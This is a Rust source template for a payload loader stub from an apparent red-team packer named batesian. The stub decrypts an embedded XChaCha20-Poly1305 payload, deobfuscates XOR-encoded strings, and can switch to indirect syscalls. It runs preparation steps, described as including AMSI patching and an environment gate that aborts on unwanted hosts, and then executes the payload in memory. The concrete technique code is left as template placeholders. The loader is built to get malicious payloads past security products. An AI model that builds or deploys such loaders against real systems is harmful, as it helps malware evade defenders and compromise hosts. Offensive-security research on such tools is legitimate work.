//! Stub generated automatically by batesian.
//!
//! Decrypts the embedded payload with XChaCha20-Poly1305, reports its per-build
//! marker on stderr, and runs the payload in memory using the selected execution
//! technique. The payload receives a command line built from `build.payload.args`
//! plus the args the operator passes to this binary. Part of a red team research
//! tool; not code for malicious use.

use chacha20poly1305::{
    aead::{Aead, KeyInit},
    XChaCha20Poly1305, Key, XNonce,
};

// --- Injected constants (packer) ---
const NONCE_HEX: &str = "$NONCE_HEX$";
const KEY_HEX: &str = "$KEY_HEX$";
const PLAINTEXT_LEN: usize = $PLAINTEXT_LEN$;

/// Encrypted payload embedded at compile time.
const PAYLOAD_ENC: &[u8] = include_bytes!("$PAYLOAD_PATH$");

// --- String obfuscation helpers (used by the injected string defs) ---
// `dec_xor` reconstructs the XOR-obfuscated literals. It is dead code (and
// stripped by the optimizer) when the `stack` strategy is active.
#[inline(never)]
#[allow(dead_code)]
fn dec_xor(bytes: &[u8], key: &[u8; 32]) -> Vec<u8> {
    let mut out = bytes.to_vec();
    for (i, b) in out.iter_mut().enumerate() {
        *b ^= key[i % 32];
    }
    out
}

fn main() {
    match run() {
        Ok(code) => std::process::exit(code),
        Err(msg) => {
            eprintln!("{msg}");
            std::process::exit(1);
        }
    }
}

fn run() -> Result<i32, String> {
    let stub_marker = $STUB_MARKER_DEF$;

    // 1. Decode nonce and key from hex.
    let nonce_vec = hex::decode(NONCE_HEX).map_err(|e| format!("invalid nonce: {e}"))?;
    let nonce: [u8; 24] = nonce_vec
        .try_into()
        .map_err(|_| "the nonce must be 24 bytes".to_string())?;
    let key_vec = hex::decode(KEY_HEX).map_err(|e| format!("invalid key: {e}"))?;
    let key: [u8; 32] = key_vec
        .try_into()
        .map_err(|_| "the key must be 32 bytes".to_string())?;

    // 2. Decrypt (verifies the Poly1305 tag).
    let cipher = XChaCha20Poly1305::new(Key::from_slice(&key));
    let mut image = cipher
        .decrypt(XNonce::from_slice(&nonce), PAYLOAD_ENC)
        .map_err(|_| "decryption failed: wrong key/nonce or tampered payload".to_string())?;

    if image.len() != PLAINTEXT_LEN {
        return Err("decrypted payload size does not match the expected size".to_string());
    }

    // 3. Report the per-build marker on stderr. This is the build's identity
    //    signal (it replaces the old modal marker dialog, which blocked
    //    automated runs); it only prints once decryption succeeded.
    eprintln!("{stub_marker}");

    // 4. Initialize the syscall layer. A no-op unless the build sets
    //    `build.stub.syscalls.mode: indirect`.
    init_syscalls()?;

    // 5. Run the Preparation techniques (process-state modifications, e.g.
    //    patching AMSI). `run_preparations` is assembled from the active
    //    preparation fragments; it returns `false` when one of them (e.g. the
    //    `bouncer` environment gate) decided to abort before the payload runs.
    if !run_preparations()? {
        // A preparation declined the host. Exit without touching the payload;
        // the technique already chose its own exit behaviour (silent vs exit 1).
        std::process::exit(0);
    }

    // 6. Run the payload with the selected Execution technique.
    //    `execute_payload` is provided by the active execution fragment.
    execute_payload(&mut image)
}

// --- Preparation techniques (injected in pipeline order) ---
$PREPARATION_BLOCKS$

// --- Syscall layer (injected; no-op unless build.stub.syscalls is set) ---
$SYSCALLS_BLOCK$

// --- Payload arguments (injected; shared by the execution techniques) ---
$ARGS_BLOCK$

// --- Payload import resolution (injected; shared by the execution techniques) ---
$IMPORTS_BLOCK$

// --- Execution technique (injected) ---
$EXECUTION_BLOCK$
